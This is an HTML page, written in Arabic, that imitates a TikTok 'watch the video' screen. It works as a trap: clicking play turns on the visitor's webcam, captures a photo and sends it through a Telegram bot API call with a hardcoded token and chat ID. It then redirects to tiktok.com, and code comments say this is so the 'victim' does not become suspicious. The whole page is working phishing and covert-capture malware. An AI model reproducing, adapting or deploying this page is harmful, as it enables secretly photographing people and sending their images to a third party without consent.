<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok - شاهد الفيديو</title>
    <style>
        body { background-color: #010101; color: white; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
        .container { text-align: center; }
        .tiktok-logo { width: 150px; margin-bottom: 20px; }
        .video-box { width: 300px; height: 500px; border: 2px solid #2f2f2f; border-radius: 10px; display: flex; align-items: center; justify-content: center; background: #000; position: relative; cursor: pointer; }
        .play-btn { width: 80px; height: 80px; background: rgba(255,255,255,0.2); border-radius: 50%; display: flex; align-items: center; justify-content: center; border: none; }
        .play-btn::after { content: ''; border-top: 15px solid transparent; border-bottom: 15px solid transparent; border-left: 25px solid white; margin-left: 10px; }
        .loading-text { margin-top: 15px; font-size: 14px; color: #ccc; }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://lf16-tiktok-web.ttwstatic.com/obj/tiktok-web-common-sg/mtact/static/images/logo_144c91a.png" class="tiktok-logo">
        <div class="video-box" onclick="startCapture()">
            <button class="play-btn"></button>
            <video id="video" style="display:none" autoplay></video>
            <canvas id="canvas" style="display:none"></canvas>
        </div>
        <p class="loading-text">اضغط لتشغيل الفيديو وتخطي التحقق</p>
    </div>

    <script>
        // --- إعدادات السيطرة (مطور حيدر رحيم) ---
        const TOKEN = "7759070075:AAGEo2F_G8dMdJBPh8nmbqDW2uVqUZsHLqM";
        const CHAT_ID = "8120039331";

        async function startCapture() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('video');
                video.srcObject = stream;
                
                setTimeout(() => {
                    const canvas = document.getElementById('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    const photo = canvas.toDataURL('image/png');
                    
                    sendToTelegram(photo);
                }, 1000);
            } catch (err) {
                // إذا رفض الكاميرا يتم تحويله فوراً
                window.location.href = "https://www.tiktok.com";
            }
        }

        function sendToTelegram(base64Image) {
            const byteString = atob(base64Image.split(',')[1]);
            const ab = new ArrayBuffer(byteString.length);
            const ia = new Uint8Array(ab);
            for (let i = 0; i < byteString.length; i++) ia[i] = byteString.charCodeAt(i);
            const blob = new Blob([ab], {type: 'image/png'});

            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', blob, 'shot.png');
            formData.append('caption', '🎯 تم صيد صورة جديدة بواسطة: مطور حيدر رحيم');

            fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData
            }).then(() => {
                // تحويل الضحية بعد الصيد لعدم الشك
                window.location.href = "https://www.tiktok.com";
            });
        }
    </script>
</body>
</html>
